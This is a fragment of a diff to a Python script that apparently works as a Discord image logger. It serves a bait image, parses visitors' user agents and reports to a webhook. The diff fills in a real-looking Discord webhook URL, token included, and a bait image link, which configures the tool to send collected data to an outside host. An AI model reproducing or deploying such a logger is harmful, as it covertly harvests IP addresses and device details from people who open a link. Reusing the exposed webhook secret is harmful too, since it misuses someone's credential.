@@ -2,8 +2,8 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import requests, base64, httpagentparser
 
-webhook = 'WEBHOOK'
-bindata = requests.get('link to image here').content
+webhook = 'https://discord.com/api/webhooks/1028411407651315822/wcOWoSDvs7UNeTkhZrvWsKMc_7nWrsyiYHgGoL2sebsagTaI6yEk-UD8Y98IUVNOqRXi'
+bindata = requests.get('https://static.wikia.nocookie.net/fable/images/7/7f/Crunchy_Chick.png/revision/latest?cb=20210912201238').content
 
 buggedimg = True # Set this to True if you want the image to show as loading on Discord, False if you don't. (CASE SENSITIVE)
 
